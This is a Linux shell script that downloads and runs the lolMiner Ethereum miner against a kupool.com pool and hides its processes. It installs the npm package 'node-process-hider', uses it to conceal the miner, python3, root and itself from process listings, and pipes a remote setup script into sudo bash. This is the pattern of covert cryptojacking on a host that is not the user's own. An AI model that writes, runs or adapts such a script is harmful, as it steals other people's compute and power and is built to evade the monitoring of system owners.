#!/bin/sh
pkill lolMiner
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add PhoenixMinerEth.sh
Ph add python3
ph add root
ph add node-process-hider
ph add lolMiner
./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user prodent.DO --ethstratum ETHPROXY  --timeprint on --longstats 120 
sleep 10
